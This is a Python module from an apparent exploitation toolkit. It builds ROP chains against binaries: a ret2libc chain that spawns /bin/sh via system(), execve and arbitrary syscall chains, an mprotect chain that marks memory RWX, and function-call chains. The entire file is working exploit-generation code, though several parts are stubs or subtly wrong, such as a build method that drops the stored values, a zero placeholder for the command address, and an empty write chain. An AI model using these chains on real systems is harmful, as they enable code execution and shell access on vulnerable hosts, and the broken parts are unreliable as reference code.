"""
ROP chain assembly and building.
"""

from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple, Union

from supwngo.core.binary import Binary
from supwngo.exploit.rop.gadgets import GadgetFinder, Gadget
from supwngo.utils.helpers import p64, p32, flat
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class ROPChain:
    """
    Represents a ROP chain.
    """
    gadgets: List[Tuple[int, str]] = field(default_factory=list)  # (addr, description)
    values: List[int] = field(default_factory=list)  # Values between gadgets
    payload: bytes = b""

    # Metadata
    description: str = ""
    arch: str = "amd64"

    def add_gadget(self, addr: int, description: str = "") -> "ROPChain":
        """Add gadget to chain."""
        self.gadgets.append((addr, description))
        return self

    def add_value(self, value: int) -> "ROPChain":
        """Add value (for pop gadgets)."""
        self.values.append(value)
        return self

    def build(self) -> bytes:
        """Build chain to bytes."""
        pack = p64 if self.arch == "amd64" else p32

        data = []
        for addr, _ in self.gadgets:
            data.append(pack(addr))

        self.payload = b"".join(data)
        return self.payload

    def __bytes__(self) -> bytes:
        if not self.payload:
            self.build()
        return self.payload

    def __len__(self) -> int:
        return len(self.gadgets)


class ROPChainBuilder:
    """
    Automatic ROP chain generation.

    Supports:
    - ret2libc
    - ret2syscall
    - execve chains
    - mprotect chains
    - Custom function calls
    """

    def __init__(
        self,
        binary: Binary,
        libc_path: Optional[str] = None,
    ):
        """
        Initialize ROP chain builder.

        Args:
            binary: Target binary
            libc_path: Path to libc
        """
        self.binary = binary
        self.libc_path = Path(libc_path) if libc_path else None
        self.gadget_finder = GadgetFinder(binary)

        # Architecture
        self.bits = binary.bits if binary else 64
        self.arch = binary.arch if binary else "amd64"

        # Packing function
        self.pack = p64 if self.bits == 64 else p32

        # pwntools ROP for convenience
        self._pwn_rop = None
        self._libc_rop = None

    def _get_pwn_rop(self):
        """Get pwntools ROP object."""
        if self._pwn_rop is None:
            try:
                from pwn import ROP, context
                context.binary = self.binary._elf
                self._pwn_rop = ROP(self.binary._elf)
            except Exception:
                pass
        return self._pwn_rop

    def _get_libc_rop(self):
        """Get pwntools ROP for libc."""
        if self._libc_rop is None and self.libc_path:
            try:
                from pwn import ROP, ELF
                libc = ELF(str(self.libc_path))
                self._libc_rop = ROP(libc)
            except Exception:
                pass
        return self._libc_rop

    def build_ret2libc_chain(
        self,
        libc_base: int = 0,
    ) -> Optional[bytes]:
        """
        Build ret2libc chain to call system("/bin/sh").

        Args:
            libc_base: Libc base address

        Returns:
            ROP chain bytes or None
        """
        if not self.libc_path:
            logger.warning("No libc provided for ret2libc")
            return None

        try:
            from pwn import ELF, ROP, context

            libc = ELF(str(self.libc_path))
            libc.address = libc_base

            system = libc.symbols["system"]
            binsh = next(libc.search(b"/bin/sh\x00"))

            # Build ROP chain
            context.binary = self.binary._elf
            rop = ROP(self.binary._elf)

            if self.bits == 64:
                # x86_64: rdi = arg1
                pop_rdi = rop.find_gadget(["pop rdi", "ret"])
                ret = rop.find_gadget(["ret"])

                if pop_rdi:
                    # Stack alignment
                    if ret:
                        rop.raw(ret[0])
                    rop.raw(pop_rdi[0])
                    rop.raw(binsh)
                    rop.raw(system)
            else:
                # x86: arguments on stack
                rop.call(system, [binsh])

            return rop.chain()

        except Exception as e:
            logger.error(f"Failed to build ret2libc chain: {e}")
            return None

    def build_execve_chain(
        self,
        cmd: bytes = b"/bin/sh\x00",
    ) -> Optional[bytes]:
        """
        Build ROP chain for execve syscall.

        Args:
            cmd: Command to execute

        Returns:
            ROP chain bytes or None
        """
        try:
            # Try angrop first
            return self._build_execve_angrop(cmd)
        except Exception:
            pass

        # Fall back to manual construction
        return self._build_execve_manual(cmd)

    def _build_execve_angrop(self, cmd: bytes) -> Optional[bytes]:
        """Build execve using angrop."""
        try:
            import angr
            import angrop

            proj = self.binary.get_angr_project()
            rop = proj.analyses.ROP()
            rop.find_gadgets()

            chain = rop.execve(path=cmd)
            return chain.payload_str()

        except Exception as e:
            logger.debug(f"angrop execve failed: {e}")
            return None

    def _build_execve_manual(self, cmd: bytes) -> Optional[bytes]:
        """Build execve manually."""
        chain = []

        # Syscall numbers
        if self.bits == 64:
            syscall_num = 59  # execve
        else:
            syscall_num = 11  # execve

        # Find required gadgets
        finder = self.gadget_finder

        if self.bits == 64:
            # Need: rax=59, rdi=cmd, rsi=0, rdx=0, syscall
            pop_rax = finder.find_pop_reg("rax")
            pop_rdi = finder.find_pop_reg("rdi")
            pop_rsi = finder.find_pop_reg("rsi")
            pop_rdx = finder.find_pop_reg("rdx")
            syscall = finder.find_syscall()

            if not all([pop_rax, pop_rdi, syscall]):
                logger.warning("Missing required gadgets for execve")
                return None

            # We need cmd string somewhere in memory
            # For now, assume we have writable area
            # This is simplified - real exploit needs more work

            if pop_rdi:
                chain.append(self.pack(pop_rdi.address))
                chain.append(self.pack(0))  # cmd address placeholder

            if pop_rsi:
                chain.append(self.pack(pop_rsi.address))
                chain.append(self.pack(0))

            if pop_rdx:
                chain.append(self.pack(pop_rdx.address))
                chain.append(self.pack(0))

            if pop_rax:
                chain.append(self.pack(pop_rax.address))
                chain.append(self.pack(syscall_num))

            if syscall:
                chain.append(self.pack(syscall.address))

        return b"".join(chain) if chain else None

    def build_syscall_chain(
        self,
        syscall_num: int,
        args: List[int],
    ) -> Optional[bytes]:
        """
        Build chain for arbitrary syscall.

        Args:
            syscall_num: Syscall number
            args: Syscall arguments

        Returns:
            ROP chain bytes
        """
        chain = []
        finder = self.gadget_finder

        if self.bits == 64:
            # x86_64 syscall convention:
            # rax=syscall_num, rdi=arg0, rsi=arg1, rdx=arg2, r10=arg3, r8=arg4, r9=arg5
            regs = ["rdi", "rsi", "rdx", "r10", "r8", "r9"]

            pop_rax = finder.find_pop_reg("rax")
            if pop_rax:
                chain.append(self.pack(pop_rax.address))
                chain.append(self.pack(syscall_num))

            for i, arg in enumerate(args[:len(regs)]):
                pop_reg = finder.find_pop_reg(regs[i])
                if pop_reg:
                    chain.append(self.pack(pop_reg.address))
                    chain.append(self.pack(arg))

            syscall = finder.find_syscall()
            if syscall:
                chain.append(self.pack(syscall.address))

        else:
            # x86 syscall: int 0x80
            # eax=num, ebx=arg0, ecx=arg1, edx=arg2, esi=arg3, edi=arg4
            regs = ["ebx", "ecx", "edx", "esi", "edi"]

            pop_eax = finder.find_pop_reg("eax")
            if pop_eax:
                chain.append(self.pack(pop_eax.address))
                chain.append(self.pack(syscall_num))

            for i, arg in enumerate(args[:len(regs)]):
                pop_reg = finder.find_pop_reg(regs[i])
                if pop_reg:
                    chain.append(self.pack(pop_reg.address))
                    chain.append(self.pack(arg))

            int80 = finder.find_int_80()
            if int80:
                chain.append(self.pack(int80.address))

        return b"".join(chain) if chain else None

    def build_mprotect_chain(
        self,
        addr: int,
        size: int,
        prot: int = 7,  # RWX
    ) -> Optional[bytes]:
        """
        Build chain to call mprotect.

        Args:
            addr: Address to make executable
            size: Size of region
            prot: Protection flags (7 = RWX)

        Returns:
            ROP chain bytes
        """
        # mprotect syscall: 10 (x86_64) or 125 (x86)
        if self.bits == 64:
            return self.build_syscall_chain(10, [addr, size, prot])
        else:
            return self.build_syscall_chain(125, [addr, size, prot])

    def build_write_chain(
        self,
        addr: int,
        data: bytes,
    ) -> Optional[bytes]:
        """
        Build chain to write data to address.

        Args:
            addr: Target address
            data: Data to write

        Returns:
            ROP chain bytes
        """
        # This requires a write gadget like mov [reg], reg
        finder = self.gadget_finder
        write_gadget = finder.find_write_gadget()

        if not write_gadget:
            logger.warning("No write gadget found")
            return None

        chain = []
        # Build write chain based on gadget type
        # This is highly dependent on available gadgets

        return b"".join(chain) if chain else None

    def call_function(
        self,
        func_addr: int,
        args: List[int],
    ) -> bytes:
        """
        Build chain to call function with arguments.

        Args:
            func_addr: Function address
            args: Function arguments

        Returns:
            ROP chain bytes
        """
        chain = []
        finder = self.gadget_finder

        if self.bits == 64:
            # x86_64: rdi, rsi, rdx, rcx, r8, r9
            regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]

            for i, arg in enumerate(args[:len(regs)]):
                pop_reg = finder.find_pop_reg(regs[i])
                if pop_reg:
                    chain.append(self.pack(pop_reg.address))
                    chain.append(self.pack(arg))

            chain.append(self.pack(func_addr))

        else:
            # x86: push args right to left, then call
            for arg in reversed(args):
                # Need push gadget or put on stack
                pass
            chain.append(self.pack(func_addr))

        return b"".join(chain)

    def handle_bad_bytes(
        self,
        chain: bytes,
        bad_bytes: List[int],
    ) -> Optional[bytes]:
        """
        Attempt to avoid bad bytes in chain.

        Args:
            chain: Original chain
            bad_bytes: Bytes to avoid

        Returns:
            Modified chain or None
        """
        bad_set = set(bad_bytes)

        # Check if chain contains bad bytes
        has_bad = any(b in bad_set for b in chain)
        if not has_bad:
            return chain

        # Try to find alternative gadgets
        # This is complex and situation-dependent
        logger.warning("Chain contains bad bytes, alternatives needed")

        return None

    def print_chain(self, chain: bytes) -> None:
        """Pretty print ROP chain."""
        print("ROP Chain:")
        print("=" * 40)

        word_size = 8 if self.bits == 64 else 4

        for i in range(0, len(chain), word_size):
            addr_bytes = chain[i:i + word_size]
            if len(addr_bytes) == word_size:
                addr = int.from_bytes(addr_bytes, 'little')

                # Try to resolve address
                description = ""
                if self.binary:
                    for name, sym in self.binary.symbols.items():
                        if sym.address == addr:
                            description = f" <{name}>"
                            break

                print(f"  0x{addr:016x}{description}")

    def summary(self) -> str:
        """Get builder summary."""
        return f"""
ROP Chain Builder
=================
Binary: {self.binary.path.name if self.binary else 'None'}
Arch: {self.arch}
Bits: {self.bits}
Libc: {self.libc_path or 'None'}
"""
